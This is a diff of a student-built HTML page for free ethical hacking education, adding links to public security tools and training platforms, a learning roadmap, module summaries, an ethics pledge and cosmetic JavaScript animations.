+              <div class="res-info"><div class="res-name">CVE Database (MITRE)</div><div class="res-desc">Official Common Vulnerabilities and Exposures database. Research real-world vulnerabilities.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://github.com/enaqx/awesome-pentest" target="_blank">
+              <div class="res-icon">⭐</div>
+              <div class="res-info"><div class="res-name">Awesome Pentest (GitHub)</div><div class="res-desc">Curated list of penetration testing resources, tools, books, and learning materials.</div><div class="res-free">100% FREE</div></div>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <!-- PANEL 4: TOOLS -->
+      <div class="res-panel">
+        <div class="res-category">
+          <div class="res-cat-title">// FREE TOOLS TO DOWNLOAD</div>
+          <div class="res-list">
+            <a class="res-link" href="https://www.kali.org/get-kali/" target="_blank">
+              <div class="res-icon">🐉</div>
+              <div class="res-info"><div class="res-name">Kali Linux</div><div class="res-desc">The hacker's OS. Download the VM or ISO. Comes with 600+ pentesting tools pre-installed.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://nmap.org/download.html" target="_blank">
+              <div class="res-icon">🗺️</div>
+              <div class="res-info"><div class="res-name">Nmap</div><div class="res-desc">Network scanner. Free, open source. The first tool every ethical hacker learns.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://portswigger.net/burp/communitydownload" target="_blank">
+              <div class="res-icon">🔒</div>
+              <div class="res-info"><div class="res-name">Burp Suite Community</div><div class="res-desc">Free version of the best web hacking proxy. Intercept and modify HTTP traffic.</div><div class="res-free">FREE VERSION</div></div>
+            </a>
+            <a class="res-link" href="https://www.wireshark.org/download.html" target="_blank">
+              <div class="res-icon">🦈</div>
+              <div class="res-info"><div class="res-name">Wireshark</div><div class="res-desc">Free network packet analyzer. Capture and inspect every packet on your network.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://www.metasploit.com/download" target="_blank">
+              <div class="res-icon">💥</div>
+              <div class="res-info"><div class="res-name">Metasploit Framework</div><div class="res-desc">Free open-source exploitation framework. Essential for every pentester. Included in Kali.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://sqlmap.org" target="_blank">
+              <div class="res-icon">💉</div>
+              <div class="res-info"><div class="res-name">SQLmap</div><div class="res-desc">Automated SQL injection tool. Free and open source. Supports all major databases.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">
+              <div class="res-icon">🐍</div>
+              <div class="res-info"><div class="res-name">THC Hydra</div><div class="res-desc">Network login brute force tool. Free and open source. 50+ protocol support.</div><div class="res-free">100% FREE</div></div>
+            </a>
+            <a class="res-link" href="https://github.com/BloodHoundAD/BloodHound" target="_blank">
+              <div class="res-icon">🩸</div>
+              <div class="res-info"><div class="res-name">BloodHound</div><div class="res-desc">Free Active Directory attack path tool. Visualizes how to escalate privileges in AD environments.</div><div class="res-free">100% FREE</div></div>
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ROADMAP -->
+<section id="roadmap">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 04. LEARNING PATH</span>
+      <h2 class="st">Complete Roadmap</h2>
+      <p class="ss">The exact path from zero to ethical hacker — with free resource links for every step.</p>
+    </div>
+    <div class="road-timeline">
+
+      <div class="road-item">
+        <div class="road-dot">01</div>
+        <div class="road-body">
+          <h3>NETWORKING FUNDAMENTALS</h3>
+          <p>You cannot hack networks you don't understand. Learn OSI model, TCP/IP, DNS, HTTP/HTTPS, IP addressing, subnetting, ports, and protocols. This is the most important foundation.</p>
+          <div class="road-tags"><span class="rtag">OSI</span><span class="rtag">TCP/IP</span><span class="rtag">DNS</span><span class="rtag">Subnetting</span><span class="rtag">Wireshark</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://www.youtube.com/@NetworkChuck" target="_blank">NetworkChuck YT</a>
+            <a class="rlink" href="https://www.professormesser.com/network-plus/n10-008/n10-008-video/n10-008-training-course/" target="_blank">Prof. Messer Network+</a>
+            <a class="rlink" href="https://www.wireshark.org/docs/" target="_blank">Wireshark Docs</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">02</div>
+        <div class="road-body">
+          <h3>LINUX MASTERY (KALI)</h3>
+          <p>Linux is the hacker's home. Learn navigation, file permissions, bash scripting, process management, cron, grep, awk, netcat, and setting up Kali Linux as your primary pentest OS.</p>
+          <div class="road-tags"><span class="rtag">Kali Linux</span><span class="rtag">Bash</span><span class="rtag">Permissions</span><span class="rtag">Scripting</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://overthewire.org/wargames/bandit/" target="_blank">OverTheWire: Bandit</a>
+            <a class="rlink" href="https://www.kali.org/docs/" target="_blank">Kali Docs</a>
+            <a class="rlink" href="https://linuxjourney.com" target="_blank">Linux Journey</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">03</div>
+        <div class="road-body">
+          <h3>PYTHON FOR HACKERS</h3>
+          <p>Learn Python to build your own tools. Write port scanners, password crackers, reverse shells, and automation scripts. Understanding code makes you a far better hacker.</p>
+          <div class="road-tags"><span class="rtag">Python3</span><span class="rtag">Sockets</span><span class="rtag">Scripting</span><span class="rtag">Automation</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://www.youtube.com/@TCMSecurityAcademy" target="_blank">TCM Security: Python</a>
+            <a class="rlink" href="https://cs50.harvard.edu/python/" target="_blank">Harvard CS50P (Free)</a>
+            <a class="rlink" href="https://docs.python.org/3/tutorial/" target="_blank">Python Official Docs</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">04</div>
+        <div class="road-body">
+          <h3>RECONNAISSANCE & OSINT</h3>
+          <p>Information is everything. Learn passive and active recon — Google dorking, Shodan, Maltego, theHarvester, Recon-ng, WHOIS lookups, and building target intelligence profiles.</p>
+          <div class="road-tags"><span class="rtag">OSINT</span><span class="rtag">Shodan</span><span class="rtag">Google Dorks</span><span class="rtag">Maltego</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://www.shodan.io" target="_blank">Shodan.io</a>
+            <a class="rlink" href="https://osintframework.com" target="_blank">OSINT Framework</a>
+            <a class="rlink" href="https://tryhackme.com/room/googledorking" target="_blank">THM: Google Dorking</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">05</div>
+        <div class="road-body">
+          <h3>SCANNING & ENUMERATION</h3>
+          <p>Discover live hosts, open ports, service versions, and OS details. Master Nmap inside out — stealth scans, NSE scripts, firewall evasion. Learn SMB, FTP, SNMP enumeration.</p>
+          <div class="road-tags"><span class="rtag">Nmap</span><span class="rtag">Gobuster</span><span class="rtag">Nikto</span><span class="rtag">Enum4linux</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://nmap.org/book/man.html" target="_blank">Nmap Manual</a>
+            <a class="rlink" href="https://tryhackme.com/room/furthernmap" target="_blank">THM: Nmap</a>
+            <a class="rlink" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb" target="_blank">HackTricks: SMB</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">06</div>
+        <div class="road-body">
+          <h3>WEB APPLICATION HACKING</h3>
+          <p>OWASP Top 10 is your bible. SQL Injection, XSS, CSRF, IDOR, SSRF, file uploads, JWT attacks. Use Burp Suite to intercept and modify every request. Practice on DVWA and PortSwigger labs.</p>
+          <div class="road-tags"><span class="rtag">OWASP Top 10</span><span class="rtag">SQLi</span><span class="rtag">XSS</span><span class="rtag">Burp Suite</span><span class="rtag">IDOR</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://portswigger.net/web-security" target="_blank">PortSwigger Academy</a>
+            <a class="rlink" href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a>
+            <a class="rlink" href="https://dvwa.co.uk" target="_blank">DVWA</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">07</div>
+        <div class="road-body">
+          <h3>EXPLOITATION</h3>
+          <p>Turn discovered vulnerabilities into access. Learn Metasploit framework, manual exploitation, CVE research, payload generation with msfvenom, and setting up listeners for reverse shells.</p>
+          <div class="road-tags"><span class="rtag">Metasploit</span><span class="rtag">Msfvenom</span><span class="rtag">Shells</span><span class="rtag">CVEs</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank">Metasploit Unleashed</a>
+            <a class="rlink" href="https://www.exploit-db.com" target="_blank">Exploit-DB</a>
+            <a class="rlink" href="https://tryhackme.com/room/metasploitintro" target="_blank">THM: Metasploit</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">08</div>
+        <div class="road-body">
+          <h3>PRIVILEGE ESCALATION</h3>
+          <p>Getting in is only half the job. Learn Linux (SUID, cron, writable files, sudo misconfigs) and Windows (token impersonation, DLL hijacking, unquoted service paths) privesc techniques.</p>
+          <div class="road-tags"><span class="rtag">Linux PrivEsc</span><span class="rtag">Windows PrivEsc</span><span class="rtag">GTFOBins</span><span class="rtag">LOLBAS</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://gtfobins.github.io" target="_blank">GTFOBins</a>
+            <a class="rlink" href="https://lolbas-project.github.io" target="_blank">LOLBAS</a>
+            <a class="rlink" href="https://tryhackme.com/room/linprivesc" target="_blank">THM: Linux PrivEsc</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="road-item">
+        <div class="road-dot">09</div>
+        <div class="road-body">
+          <h3>CTF COMPETITIONS & PRACTICE</h3>
+          <p>Apply everything in real-time competitions. CTFs sharpen your thinking, expose you to new techniques, and are the best way to build a portfolio. Start with PicoCTF then move to HTB/THM.</p>
+          <div class="road-tags"><span class="rtag">PicoCTF</span><span class="rtag">HTB</span><span class="rtag">TryHackMe</span><span class="rtag">CTFtime</span></div>
+          <div class="road-links">
+            <a class="rlink" href="https://picoctf.org" target="_blank">PicoCTF</a>
+            <a class="rlink" href="https://hackthebox.com" target="_blank">HackTheBox</a>
+            <a class="rlink" href="https://ctftime.org" target="_blank">CTFtime.org</a>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- MODULES -->
+<section id="modules">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 05. FREE CURRICULUM</span>
+      <h2 class="st">Learning Modules</h2>
+      <p class="ss">Structured modules covering ethical hacking from zero to advanced. All free, always.</p>
+    </div>
+    <div class="mod-grid">
+      <div class="mod-card"><div class="mod-n">MODULE 01</div><span class="mod-icon">🌐</span><h3>Networking Foundations</h3><p>OSI model, TCP/IP stack, subnetting, DNS, routing, VLANs, firewalls, and deep packet inspection with Wireshark.</p><div class="mod-meta"><div class="mod-les">▸ 8 LESSONS</div><div class="mod-lvl beg">BEGINNER</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 02</div><span class="mod-icon">🐧</span><h3>Linux for Hackers</h3><p>File system, permissions, bash scripting, process management, networking commands, and full Kali Linux setup.</p><div class="mod-meta"><div class="mod-les">▸ 10 LESSONS</div><div class="mod-lvl beg">BEGINNER</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 03</div><span class="mod-icon">🐍</span><h3>Python for Hacking</h3><p>Write port scanners, reverse shells, credential harvesters, and automate attacks with Python scripts from scratch.</p><div class="mod-meta"><div class="mod-les">▸ 12 LESSONS</div><div class="mod-lvl int">INTERMEDIATE</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 04</div><span class="mod-icon">🔍</span><h3>Recon & OSINT</h3><p>Google dorking, Shodan, theHarvester, Maltego, DNS enumeration, and building full target intelligence profiles.</p><div class="mod-meta"><div class="mod-les">▸ 9 LESSONS</div><div class="mod-lvl beg">BEGINNER</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 05</div><span class="mod-icon">🗺️</span><h3>Nmap Deep Dive</h3><p>Host discovery, SYN scans, UDP, service/version detection, OS fingerprinting, NSE scripts, and firewall evasion.</p><div class="mod-meta"><div class="mod-les">▸ 7 LESSONS</div><div class="mod-lvl int">INTERMEDIATE</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 06</div><span class="mod-icon">🕸️</span><h3>Web App Hacking</h3><p>OWASP Top 10 — SQLi, XSS, CSRF, IDOR, SSRF, broken auth, file upload, JWT attacks, and Burp Suite workflow.</p><div class="mod-meta"><div class="mod-les">▸ 15 LESSONS</div><div class="mod-lvl int">INTERMEDIATE</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 07</div><span class="mod-icon">💥</span><h3>Metasploit Framework</h3><p>Modules, payloads, encoders, meterpreter, post-exploitation, persistence, and pivoting through compromised networks.</p><div class="mod-meta"><div class="mod-les">▸ 11 LESSONS</div><div class="mod-lvl int">INTERMEDIATE</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 08</div><span class="mod-icon">🔑</span><h3>Password Attacks</h3><p>Wordlists, dictionary attacks, rule-based cracking with Hashcat and John the Ripper, rainbow tables, and credential stuffing.</p><div class="mod-meta"><div class="mod-les">▸ 8 LESSONS</div><div class="mod-lvl int">INTERMEDIATE</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 09</div><span class="mod-icon">📶</span><h3>Wireless Hacking</h3><p>WEP/WPA/WPA2 cracking, deauth attacks, evil twin access points, Aircrack-ng suite, and wireless network security.</p><div class="mod-meta"><div class="mod-les">▸ 8 LESSONS</div><div class="mod-lvl adv">ADVANCED</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 10</div><span class="mod-icon">🪟</span><h3>Windows Priv Esc</h3><p>Token impersonation, DLL hijacking, AlwaysInstallElevated, stored credentials, scheduled tasks, and Active Directory basics.</p><div class="mod-meta"><div class="mod-les">▸ 10 LESSONS</div><div class="mod-lvl adv">ADVANCED</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 11</div><span class="mod-icon">🎭</span><h3>Social Engineering</h3><p>Phishing campaigns, pretexting, vishing, SET toolkit, email spoofing, and understanding human-layer vulnerabilities.</p><div class="mod-meta"><div class="mod-les">▸ 6 LESSONS</div><div class="mod-lvl int">INTERMEDIATE</div></div></div>
+      <div class="mod-card"><div class="mod-n">MODULE 12</div><span class="mod-icon">📝</span><h3>Pentest Reporting</h3><p>CVSS scoring, executive summaries, technical findings, screenshots, remediation advice, and professional deliverables.</p><div class="mod-meta"><div class="mod-les">▸ 5 LESSONS</div><div class="mod-lvl beg">ALL LEVELS</div></div></div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- TOOLS -->
+<section id="tools">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 06. TOOLBOX</span>
+      <h2 class="st">Essential Tools</h2>
+      <p class="ss">Every tool here is free and open source. Click to download.</p>
+    </div>
+    <div class="tools-grid">
+      <div class="tool"><div class="tool-name">Nmap</div><div class="tool-cat">SCANNING</div><div class="tool-desc">Network mapper. The first tool you learn. Port scanning, OS detection, NSE scripts.</div><a href="https://nmap.org/download.html" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Metasploit</div><div class="tool-cat">EXPLOITATION</div><div class="tool-desc">World's best pentesting framework. 2000+ exploits, payloads, and modules.</div><a href="https://www.metasploit.com/download" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Burp Suite</div><div class="tool-cat">WEB HACKING</div><div class="tool-desc">Intercept HTTP/HTTPS traffic. Community edition is free and powerful enough.</div><a href="https://portswigger.net/burp/communitydownload" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Wireshark</div><div class="tool-cat">PACKET ANALYSIS</div><div class="tool-desc">Capture and analyze every packet. Essential for network analysis.</div><a href="https://www.wireshark.org/download.html" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Aircrack-ng</div><div class="tool-cat">WIRELESS</div><div class="tool-desc">Complete WiFi security auditing suite. WEP and WPA/WPA2 key cracking.</div><a href="https://www.aircrack-ng.org/downloads.html" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">SQLmap</div><div class="tool-cat">SQL INJECTION</div><div class="tool-desc">Automated SQL injection and database takeover tool. Included in Kali.</div><a href="https://sqlmap.org" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Hashcat</div><div class="tool-cat">PASSWORD</div><div class="tool-desc">World's fastest GPU hash cracker. Supports 300+ hash types.</div><a href="https://hashcat.net/hashcat/" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">John the Ripper</div><div class="tool-cat">PASSWORD</div><div class="tool-desc">Classic password cracker with wordlist and brute force modes.</div><a href="https://www.openwall.com/john/" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Nikto</div><div class="tool-cat">WEB SCAN</div><div class="tool-desc">Web server vulnerability scanner. Detects dangerous files and misconfigs.</div><a href="https://github.com/sullo/nikto" target="_blank">→ GitHub Free</a></div>
+      <div class="tool"><div class="tool-name">Gobuster</div><div class="tool-cat">DIR ENUM</div><div class="tool-desc">Brute-force directories and DNS subdomains. Fast Go-based tool.</div><a href="https://github.com/OJ/gobuster" target="_blank">→ GitHub Free</a></div>
+      <div class="tool"><div class="tool-name">Hydra</div><div class="tool-cat">BRUTE FORCE</div><div class="tool-desc">50+ protocol login brute forcer. SSH, FTP, HTTP, RDP and more.</div><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">→ GitHub Free</a></div>
+      <div class="tool"><div class="tool-name">Maltego CE</div><div class="tool-cat">OSINT</div><div class="tool-desc">Visual OSINT and link analysis. Community Edition is free.</div><a href="https://www.maltego.com/downloads/" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">theHarvester</div><div class="tool-cat">RECON</div><div class="tool-desc">Gather emails, names, hosts from public sources. Included in Kali.</div><a href="https://github.com/laramies/theHarvester" target="_blank">→ GitHub Free</a></div>
+      <div class="tool"><div class="tool-name">BloodHound</div><div class="tool-cat">ACTIVE DIR</div><div class="tool-desc">Map Active Directory attack paths. Graph visualization of privilege escalation routes.</div><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank">→ GitHub Free</a></div>
+      <div class="tool"><div class="tool-name">OWASP ZAP</div><div class="tool-cat">WEB PROXY</div><div class="tool-desc">Free Burp alternative by OWASP. Great for automated web scanning.</div><a href="https://www.zaproxy.org/download/" target="_blank">→ Download Free</a></div>
+      <div class="tool"><div class="tool-name">Netcat</div><div class="tool-cat">NETWORKING</div><div class="tool-desc">The Swiss army knife of networking. Port scanning, banners, file transfer, shells.</div><a href="https://nmap.org/ncat/" target="_blank">→ Included in Kali</a></div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- QUIZ -->
+<section id="quiz">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 07. KNOWLEDGE CHECK</span>
+      <h2 class="st">Test Yourself</h2>
+      <p class="ss">10 questions curated by Kritan. Can you score 10/10?</p>
+    </div>
+    <div class="quiz-wrap">
+      <div class="qprog" id="qp">Question 1 of 10</div>
+      <div class="qbar"><div class="qbar-f" id="qbf" style="width:10%"></div></div>
+      <div class="qq" id="qq">Loading...</div>
+      <div class="qopts" id="qo"></div>
+      <div class="qfb" id="qfb"></div>
+      <div class="qctl">
+        <div class="qsc">Score: <span id="qs">0</span> / <span id="qt">0</span></div>
+        <button class="btn btn-g" id="qnxt" style="display:none" onclick="nextQ()">NEXT →</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ETHICS -->
+<section id="ethics">
+  <div class="container">
+    <div class="sh">
+      <span class="stag">// 08. CODE OF ETHICS</span>
+      <h2 class="st">The Ethical Pledge</h2>
+      <p class="ss">My personal code — every learner on this site is expected to honor this.</p>
+    </div>
+    <div class="pledge">
+      <p>I'm Kritan — a student, not a criminal. Everything I learn here is for <strong>defense, education, and authorized testing only</strong>. The skills are powerful; using them wrong destroys trust and lands you in prison. Use them right and you protect the world.</p>
+      <ol>
+        <li><div class="pn">01</div>I will <strong>never access any system without explicit written permission</strong> from the owner. No exceptions.</li>
+        <li><div class="pn">02</div>I will <strong>define scope clearly</strong> before every engagement and never exceed those boundaries.</li>
+        <li><div class="pn">03</div>I will <strong>report all vulnerabilities responsibly</strong> to authorized parties. I will never exploit them for personal gain.</li>
+        <li><div class="pn">04</div>I will <strong>protect confidential data</strong> I encounter during any authorized test. I will not retain or share it.</li>
+        <li><div class="pn">05</div>I will <strong>practice only on systems I own or have explicit permission to test</strong> — labs, VMs, CTF platforms.</li>
+        <li><div class="pn">06</div>I will <strong>continuously learn and improve</strong> my skills ethically through legal channels only.</li>
+        <li><div class="pn">07</div>I will <strong>use this knowledge to protect, not to harm</strong>. Cybersecurity exists to defend people.</li>
+        <li><div class="pn">08</div>I will <strong>share free knowledge generously</strong> — just like this site does — because education should have no gatekeepers.</li>
+      </ol>
+      <div class="sig">// — Kritan, Nepal 🇳🇵</div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="foot-logo">Kr1t4n.sec</div>
+  <p>Free Ethical Hacking Education · Built &amp; Designed by <strong style="color:var(--g)">Kritan</strong> · Class 12 Science, Nepal 🇳🇵</p>
+  <p>Every line of code on this site was written by hand. No templates. No generators. Just a student who wanted to share.</p>
+  <div class="foot-warn">⚠ All knowledge here is for authorized, legal, ethical use ONLY. Unauthorized system access is a crime.</div>
+  <div class="foot-credit">
+    DESIGNED BY <span>KRITAN</span> · DEVELOPED BY <span>KRITAN</span> · CONTENT BY <span>KRITAN</span> · MADE IN <span>NEPAL 🇳🇵</span><br>
+    <span style="font-size:0.6rem;color:var(--dim)">// Single HTML file · Pure HTML/CSS/JS · No frameworks · No paywalls · No BS //</span>
+  </div>
+</footer>
 
 <script>
-  // Free Resources Data with Clickable Links
-  const freeResources = [
-    { name: "PortSwigger Web Security Academy", desc: "Free web security labs (SQLi, XSS, SSRF, etc)", url: "https://portswigger.net/web-security", icon: "🌐" },
-    { name: "TryHackMe", desc: "Free rooms for beginners to advanced", url: "https://tryhackme.com", icon: "🎮" },
-    { name: "Hack The Box", desc: "Free machines & starting point", url: "https://www.hackthebox.com", icon: "📦" },
-    { name: "OverTheWire (Bandit)", desc: "Linux wargames for beginners", url: "https://overthewire.org", icon: "🐧" },
-    { name: "picoCTF", desc: "Educational CTF platform", url: "https://picoctf.org", icon: "🏆" },
-    { name: "OWASP Top 10", desc: "Web vulnerabilities guide", url: "https://owasp.org/www-project-top-ten/", icon: "📖" },
-    { name: "Cybrary Free Courses", desc: "Free cybersecurity courses", url: "https://www.cybrary.it", icon: "📚" },
-    { name: "Cisco Networking Academy", desc: "Free networking courses", url: "https://www.netacad.com", icon: "🌍" },
-    { name: "Youtube - IppSec", desc: "HTB walkthroughs & methodology", url: "https://www.youtube.com/c/ippsec", icon: "🎥" },
-    { name: "The Cyber Mentor (Zero to Hero)", desc: "Free ethical hacking course", url: "https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_7HkcAY7k", icon: "🎓" }
-  ];
+// ── MATRIX RAIN ──
+(function(){
+  const c=document.getElementById('bg-canvas');
+  const x=c.getContext('2d');
+  let W,H,cols,drops;
+  const chars='アイウエオカキクケコサシスセソタチツテトABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>{}[]|/\\;:@#$%^&*()_+-=~`';
+  function init(){
+    W=c.width=window.innerWidth;H=c.height=window.innerHeight;
+    cols=Math.floor(W/16);drops=Array(cols).fill(0).map(()=>Math.random()*-80);
+  }
+  function draw(){
+    x.fillStyle='rgba(1,8,1,0.05)';x.fillRect(0,0,W,H);
+    x.font='13px Share Tech Mono';
+    drops.forEach((y,i)=>{
+      const intensity=Math.random();
+      x.fillStyle=intensity>0.98?'#ffffff':intensity>0.9?'#00ff41':'#003311';
+      x.fillText(chars[Math.floor(Math.random()*chars.length)],i*16,y*16);
+      drops[i]=(y*16>H&&Math.random()>0.975)?0:y+1;
+    });
+  }
+  init();setInterval(draw,35);window.addEventListener('resize',init);
+})();
 
-  const toolsList = [
-    { name: "Nmap", desc: "Network scanner & vulnerability detection", url: "https://nmap.org" },
-    { name: "Burp Suite Community", desc: "Web proxy & pentesting tool", url: "https://portswigger.net/burp/communitydownload" },
-    { name: "Metasploit Framework", desc: "Exploit development", url: "https://www.metasploit.com" },
-    { name: "Wireshark", desc: "Packet analyzer", url: "https://www.wireshark.org" },
-    { name: "John the Ripper", desc: "Password cracking", url: "https://www.openwall.com/john/" },
-    { name: "SQLmap", desc: "SQL injection automation", url: "https://sqlmap.org" },
-    { name: "BloodHound", desc: "AD relationship mapping", url: "https://github.com/BloodHoundAD/BloodHound" },
-    { name: "Impacket", desc: "Python network protocols", url: "https://github.com/SecureAuthCorp/impacket" }
-  ];
-
-  const freeCerts = [
-    { name: "Google Cybersecurity Certificate", desc: "Professional certificate (financial aid available)", url: "https://grow.google/cybersecurity/", icon: "📜" },
-    { name: "IBM Cybersecurity Analyst", desc: "Coursera free audit", url: "https://www.coursera.org/professional-certificates/ibm-cybersecurity-analyst", icon: "💼" },
-    { name: "Introduction to Cyber Security (Cisco)", desc: "Free certification", url: "https://www.netacad.com/courses/cybersecurity/introduction-cybersecurity", icon: "🔐" },
-    { name: "TryHackMe Pre-Security", desc: "Free learning path", url: "https://tryhackme.com/path/outline/presecurity", icon: "🎯" },
-    { name: "INCO Academy Cybersecurity", desc: "Free government-funded", url: "https://inco.academy/cybersecurity", icon: "🌍" }
-  ];
-
-  function renderResources() {
-    const container = document.getElementById('resourcesGrid');
-    if(container) {
-      container.innerHTML = freeResources.map(r => `
-        <div class="resource-card">
-          <h3>${r.icon} ${r.name}</h3>
-          <p>${r.desc}</p>
-          <a href="${r.url}" target="_blank" class="btn-link"><i class="fas fa-external-link-alt"></i> Access Free Resource →</a>
-        </div>
-      `).join('');
+// ── TYPEWRITER ──
+(function(){
+  const lines=['Ethical Hacker in Training...','Red Team Concepts & Python...','Free Education for Everyone...','Built from Nepal, for the World...','Knowledge Must Be Free 🇳🇵','CTF Player · Self-Taught · Curious'];
+  let li=0,ci=0,del=false;
+  const el=document.getElementById('typewriter');
+  function type(){
+    const line=lines[li];
+    if(!del){
+      el.textContent=line.slice(0,++ci);
+      if(ci===line.length){del=true;setTimeout(type,1800);return;}
+      setTimeout(type,60);
+    }else{
+      el.textContent=line.slice(0,--ci);
+      if(ci===0){del=false;li=(li+1)%lines.length;setTimeout(type,400);return;}
+      setTimeout(type,30);
     }
   }
+  type();
+})();
 
-  function renderTools() {
-    const container = document.getElementById('toolsGrid');
-    if(container) {
-      container.innerHTML = toolsList.map(t => `
-        <div class="resource-card">
-          <h3><i class="fas fa-terminal"></i> ${t.name}</h3>
-          <p>${t.desc}</p>
-          <a href="${t.url}" target="_blank" class="btn-link">Download/Info →</a>
-        </div>
-      `).join('');
-    }
-  }
-
-  function renderCerts() {
-    const container = document.getElementById('certsGrid');
-    if(container) {
-      container.innerHTML = freeCerts.map(c => `
-        <div class="resource-card">
-          <h3>${c.icon} ${c.name}</h3>
-          <p>${c.desc}</p>
-          <a href="${c.url}" target="_blank" class="btn-link">Enroll Free →</a>
-        </div>
-      `).join('');
-    }
-  }
-
-  // Progress Tracking
-  let completedSections = new Set(JSON.parse(localStorage.getItem('kritan_completed') || '[]'));
-  const totalSections = 10;
-  function updateProgress() {
-    const percent = Math.floor((completedSections.size / totalSections) * 100);
-    document.getElementById('progressPercent').innerText = percent;
-    document.getElementById('progressFill').style.width = percent + '%';
-    localStorage.setItem('kritan_completed', JSON.stringify([...completedSections]));
-  }
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if(entry.isIntersecting && entry.target.id && !['home','about'].includes(entry.target.id)) {
-        if(!completedSections.has(entry.target.id)) {
-          completedSections.add(entry.target.id);
-          updateProgress();
-        }
+// ── SKILL BARS ──
+(function(){
+  const obs=new IntersectionObserver((entries)=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting){
+        e.target.querySelectorAll('.sbar-fill').forEach(b=>{
+          b.style.width=b.dataset.w+'%';
+        });
+        obs.unobserve(e.target);
       }
     });
-  }, { threshold: 0.4 });
-  document.querySelectorAll('section[id]').forEach(section => observer.observe(section));
-  updateProgress();
+  },{threshold:0.3});
+  const ac=document.querySelector('.about-card');
+  if(ac)obs.observe(ac);
+})();
 
-  // Search
-  document.getElementById('globalSearch').addEventListener('input', (e) => {
-    const query = e.target.value.toLowerCase();
-    const sections = document.querySelectorAll('section');
-    let found = false;
-    sections.forEach(section => {
-      const text = section.innerText.toLowerCase();
-      if(query === '') section.style.display = 'block';
-      else if(text.includes(query)) { section.style.display = 'block'; if(!found) { section.scrollIntoView({ behavior: 'smooth' }); found = true; } }
-      else section.style.display = 'none';
-    });
-    if(query && !found) alert('No results. Try: SQL injection, Active Directory, Nmap, Reverse Shell');
-  });
+// ── SCROLL ANIMATIONS ──
+const io=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('vis');});
+},{threshold:0.12});
+document.querySelectorAll('.road-item').forEach(el=>io.observe(el));
 
-  // Copy buttons
-  document.querySelectorAll('.copy-btn').forEach(btn => {
-    btn.addEventListener('click', function() {
-      const pre = this.closest('.code-block')?.querySelector('pre');
-      if(pre) { navigator.clipboard.writeText(pre.innerText); this.innerHTML = '✓'; setTimeout(() => this.innerHTML = 'Copy', 1500); }
-    });
+// ── RESOURCE TABS ──
+function showTab(idx){
+  document.querySelectorAll('.res-tab').forEach((t,i)=>{
+    t.classList.toggle('active',i===idx);
   });
